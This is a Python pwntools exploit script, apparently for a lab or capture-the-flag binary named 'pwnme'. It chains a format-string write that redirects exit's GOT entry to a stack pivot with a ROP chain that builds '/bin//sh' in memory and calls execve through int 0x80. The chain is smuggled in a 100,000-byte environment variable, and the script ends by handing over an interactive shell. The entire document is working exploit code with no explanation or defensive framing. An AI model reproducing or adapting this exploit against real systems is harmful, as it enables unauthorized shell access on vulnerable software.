```py
#!/usr/bin/python
from pwn import *
from struct import pack

context.arch = 'i386'
context.terminal = ['tmux']
context.os = 'linux'
context.bits = 32

exit_got = 0x8049754
stack_pivot = 0xb7e28817 # ret 0x6642


writes = {
	exit_got: stack_pivot
}

p = "\x41"*24348 			# padding...
p += pack('<I', 0xb7e54d8c) # xor eax, eax ; ret
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf040) # @ .data
p += pack('<I', 0xb7e4cab8) # pop eax ; ret
p += '/bin'
p += pack('<I', 0xb7ece29c) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf044) # @ .data + 4
p += pack('<I', 0xb7e4cab8) # pop eax ; ret
p += '//sh'
p += pack('<I', 0xb7ece29c) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf048) # @ .data + 8
p += pack('<I', 0xb7e54d8c) # xor eax, eax ; ret
p += pack('<I', 0xb7ece29c) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e3f8ae) # pop ebx ; ret
p += pack('<I', 0xb7fcf040) # @ .data
p += pack('<I', 0xb7e5412b) # pop ecx ; pop edx ; ret
p += pack('<I', 0xb7fcf048) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf048) # @ .data + 8
p += pack('<I', 0xb7e54d8c) # xor eax, eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e543f5) # int 0x80

p += "\x41"*(100000-len(p))

environment = {
"TERM":"xterm-256color",
"SHELL":"/bin/bash",
"SSH_CLIENT":"192.168.85.131 57940 22",
"OLDPWD":"/opt",
"SSH_TTY":"/dev/pts/0",
"EGG":p,
"USER":"tux",
"MAIL":"/var/mail/tux",
"PATH":"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games",
"PWD":"/home/tux/0x01",
"LANG":"en_US.UTF-8",
"SHLVL":"1",
"HOME":"/home/tux",
"LOGNAME":"tux",
"SSH_CONNECTION":"192.168.85.131 57940 192.168.85.139 22"
}


payload = fmtstr_payload(4, writes, write_size='short')
log.info(payload)
p = process(['/home/tux/0x01/pwnme'], env=environment)
p.sendline("run")

p.sendline(payload)
p.clean()
p.interactive()

```